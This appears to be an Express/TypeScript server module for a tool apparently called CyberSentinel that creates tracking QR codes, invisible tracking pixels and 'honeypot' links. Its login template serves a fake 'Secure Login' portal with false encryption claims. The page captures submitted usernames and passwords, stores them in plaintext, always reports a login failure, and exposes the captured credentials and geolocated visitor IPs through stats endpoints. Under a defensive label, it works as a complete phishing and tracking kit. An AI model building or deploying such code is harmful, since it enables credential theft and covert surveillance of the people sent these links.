import { Router, type Request, type Response } from "express";
import mongoose, { Schema, Document } from "mongoose";
const router = Router();

interface IHit {
  ip: string;
  userAgent: string;
  referer: string;
  timestamp: Date;
  country?: string;
  city?: string;
  isp?: string;
  capturedUsername?: string;
  capturedPassword?: string;
}

interface ITrack extends Document {
  type: "qr" | "honeypot";
  uid: string;
  label: string;
  redirectUrl?: string;
  honeypotTemplate?: "pixel" | "login";
  hits: IHit[];
  createdAt: Date;
}

const TrackSchema = new Schema<ITrack>({
  type: { type: String, enum: ["qr", "honeypot"], required: true },
  uid: { type: String, required: true, unique: true, index: true },
  label: { type: String, default: "" },
  redirectUrl: { type: String },
  honeypotTemplate: { type: String, enum: ["pixel", "login"], default: "pixel" },
  hits: [{
    ip: String,
    userAgent: String,
    referer: String,
    timestamp: { type: Date, default: Date.now },
    country: String,
    city: String,
    isp: String,
    capturedUsername: String,
    capturedPassword: String,
  }],
  createdAt: { type: Date, default: Date.now },
});

const Track = mongoose.models.Track ?? mongoose.model<ITrack>("Track", TrackSchema);

function uid() {
  return Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
}

async function logHit(track: ITrack, req: Request, extras: Partial<IHit> = {}) {
  const ip = String(req.headers["x-forwarded-for"] ?? req.socket.remoteAddress ?? "unknown").split(",")[0].trim();
  const hit: any = {
    ip,
    userAgent: req.headers["user-agent"] ?? "",
    referer: req.headers["referer"] ?? "",
    timestamp: new Date(),
    ...extras,
  };
  try {
    const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,isp`, { signal: AbortSignal.timeout(3000) });
    if (geo.ok) {
      const g: any = await geo.json();
      hit.country = g.country;
      hit.city = g.city;
      hit.isp = g.isp;
    }
  } catch {}
  track.hits.push(hit);
  await track.save();
}

const LOGIN_PAGE_HTML = (uid: string, label: string) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Login — ${label || "Admin Portal"}</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{background:#0f0f1a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
    .wrap{width:100%;max-width:420px;padding:16px;}
    .card{background:#16213e;border:1px solid #1e3a6e;border-radius:12px;padding:48px 40px;box-shadow:0 25px 80px rgba(0,0,0,0.6);}
    .logo-wrap{text-align:center;margin-bottom:32px;}
    .logo-circle{width:72px;height:72px;background:linear-gradient(135deg,#1e3a6e,#2563eb);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:32px;box-shadow:0 4px 24px rgba(37,99,235,0.35);}
    h1{color:#e2e8f0;font-size:22px;font-weight:700;margin-bottom:4px;}
    .sub{color:#64748b;font-size:13px;}
    .field{margin-bottom:18px;}
    label{display:block;color:#94a3b8;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:8px;}
    input{width:100%;background:#0d1117;border:1px solid #1e293b;border-radius:8px;padding:12px 16px;color:#e2e8f0;font-size:14px;outline:none;transition:border-color .2s,box-shadow .2s;}
    input:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,0.15);}
    input::placeholder{color:#334155;}
    .forgot{text-align:right;margin-top:-10px;margin-bottom:18px;}
    .forgot a{color:#3b82f6;font-size:12px;text-decoration:none;}
    .btn{width:100%;background:linear-gradient(135deg,#2563eb,#1d4ed8);border:none;border-radius:8px;padding:13px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;letter-spacing:0.3px;transition:opacity .2s,transform .1s;}
    .btn:hover{opacity:0.92;}
    .btn:active{transform:scale(0.99);}
    .btn:disabled{opacity:0.6;cursor:not-allowed;}
    .err{color:#f87171;font-size:13px;text-align:center;margin-top:14px;padding:10px;background:rgba(248,113,113,0.08);border:1px solid rgba(248,113,113,0.2);border-radius:6px;display:none;}
    .divider{display:flex;align-items:center;gap:12px;margin:20px 0;color:#334155;font-size:11px;}
    .divider::before,.divider::after{content:'';flex:1;height:1px;background:#1e293b;}
    .footer{text-align:center;margin-top:24px;color:#334155;font-size:11px;}
    .footer span{color:#475569;}
    .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:6px;}
    @keyframes spin{to{transform:rotate(360deg);}}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="logo-wrap">
        <div class="logo-circle">🔐</div>
        <h1>${label || "Admin Portal"}</h1>
        <div class="sub">Sign in to your account to continue</div>
      </div>
      <form id="form" onsubmit="doLogin(event)">
        <div class="field">
          <label>Username or Email</label>
          <input type="text" id="u" name="username" placeholder="Enter your username" required autocomplete="username" />
        </div>
        <div class="field">
          <label>Password</label>
          <input type="password" id="p" name="password" placeholder="Enter your password" required autocomplete="current-password" />
        </div>
        <div class="forgot"><a href="#">Forgot password?</a></div>
        <button type="submit" class="btn" id="btn">Sign In</button>
        <div class="err" id="err">⚠ Invalid credentials. Please verify your details and try again.</div>
      </form>
      <div class="divider">secured connection</div>
      <div class="footer">🔒 256-bit SSL encryption · <span>© 2024 SecurePortal™</span></div>
    </div>
  </div>
  <script>
    async function doLogin(e){
      e.preventDefault();
      const btn=document.getElementById('btn');
      btn.innerHTML='<span class="spinner"></span>Signing in...';
      btn.disabled=true;
      document.getElementById('err').style.display='none';
      const u=document.getElementById('u').value;
      const p=document.getElementById('p').value;
      try{
        await fetch(location.pathname.replace('/visit','/login'),{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({username:u,password:p})
        });
      }catch(e){}
      await new Promise(r=>setTimeout(r,1800));
      document.getElementById('err').style.display='block';
      btn.innerHTML='Sign In';
      btn.disabled=false;
      document.getElementById('u').value='';
      document.getElementById('p').value='';
    }
  </script>
</body>
</html>`;

router.post("/tracker/qr", async (req, res) => {
  const { label = "QR Code", redirectUrl = "" } = req.body ?? {};
  const id = uid();
  const baseUrl = process.env.REPLIT_DEV_DOMAIN
    ? `https://${process.env.REPLIT_DEV_DOMAIN}`
    : `http://localhost:${process.env.API_PORT ?? 8080}`;
  const trackUrl = `${baseUrl}/api/tracker/qr/${id}/scan`;
  const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(trackUrl)}&size=200x200`;

  try {
    await Track.create({ type: "qr", uid: id, label, redirectUrl });
    res.json({ id, uid: id, label, trackUrl, qrImageUrl, redirectUrl });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

router.get("/tracker/qr/:id/scan", async (req, res) => {
  const track = await Track.findOne({ uid: req.params.id, type: "qr" }).catch(() => null);
  if (!track) { res.status(404).send("Not found"); return; }
  await logHit(track, req);
  const redirect = track.redirectUrl || "https://cybersentinel.app";
  res.redirect(302, redirect);
});

router.get("/tracker/qr/:id/stats", async (req, res) => {
  const track = await Track.findOne({ uid: req.params.id, type: "qr" }).catch(() => null);
  if (!track) { res.status(404).json({ error: "not found" }); return; }
  res.json({ id: track.uid, label: track.label, hits: track.hits.length, log: track.hits, createdAt: track.createdAt });
});

router.post("/tracker/honeypot", async (req, res) => {
  const { label = "Honeypot", template = "pixel" } = req.body ?? {};
  const id = uid();
  const baseUrl = process.env.REPLIT_DEV_DOMAIN
    ? `https://${process.env.REPLIT_DEV_DOMAIN}`
    : `http://localhost:${process.env.API_PORT ?? 8080}`;
  const pixelUrl = `${baseUrl}/api/tracker/honeypot/${id}/pixel.gif`;
  const linkUrl = `${baseUrl}/api/tracker/honeypot/${id}/visit`;

  try {
    const honeypotTemplate = template === "login" ? "login" : "pixel";
    await Track.create({ type: "honeypot", uid: id, label, honeypotTemplate });
    res.json({ id, uid: id, label, pixelUrl, linkUrl, template: honeypotTemplate });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

const TRANSPARENT_GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");

router.get("/tracker/honeypot/:id/pixel.gif", async (req, res) => {
  const track = await Track.findOne({ uid: req.params.id, type: "honeypot" }).catch(() => null);
  if (track) await logHit(track, req);
  res.set({ "Content-Type": "image/gif", "Cache-Control": "no-store, no-cache" });
  res.send(TRANSPARENT_GIF);
});

router.get("/tracker/honeypot/:id/visit", async (req, res) => {
  const track = await Track.findOne({ uid: req.params.id, type: "honeypot" }).catch(() => null);
  if (!track) { res.status(404).send("Not found"); return; }
  await logHit(track, req);

  if (track.honeypotTemplate === "login") {
    res.set("Content-Type", "text/html");
    res.send(LOGIN_PAGE_HTML(track.uid, track.label));
    return;
  }

  res.set("Content-Type", "text/html");
  res.send(`<!DOCTYPE html><html><head><title>403 Forbidden</title><style>body{background:#0a0a0a;color:#ff3333;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:8px;}h1{font-size:48px;margin:0;}p{color:#555;font-size:12px;}</style></head><body><h1>403</h1><p>Access Forbidden</p></body></html>`);
});

router.post("/tracker/honeypot/:id/login", async (req, res) => {
  const track = await Track.findOne({ uid: req.params.id, type: "honeypot" }).catch(() => null);
  if (!track) { res.status(404).json({ error: "not found" }); return; }
  const { username = "", password = "" } = req.body ?? {};
  await logHit(track, req, {
    capturedUsername: String(username).substring(0, 200),
    capturedPassword: String(password).substring(0, 200),
  });
  res.json({ ok: true });
});

router.get("/tracker/honeypot/:id/stats", async (req, res) => {
  const track = await Track.findOne({ uid: req.params.id, type: "honeypot" }).catch(() => null);
  if (!track) { res.status(404).json({ error: "not found" }); return; }
  res.json({
    id: track.uid,
    label: track.label,
    template: track.honeypotTemplate ?? "pixel",
    hits: track.hits.length,
    log: track.hits.map(h => ({
      ip: h.ip,
      userAgent: h.userAgent,
      referer: h.referer,
      timestamp: h.timestamp,
      country: h.country,
      city: h.city,
      isp: h.isp,
      capturedUsername: h.capturedUsername,
      capturedPassword: h.capturedPassword,
    })),
    createdAt: track.createdAt,
  });
});

router.get("/tracker/list", async (req, res) => {
  const items = await Track.find({}, { hits: 0 }).sort({ createdAt: -1 }).limit(50).catch(() => []);
  res.json(items.map(t => ({
    id: t.uid,
    type: t.type,
    label: t.label,
    template: t.honeypotTemplate ?? "pixel",
    hitCount: t.hits?.length ?? 0,
    createdAt: t.createdAt,
  })));
});

export default router;
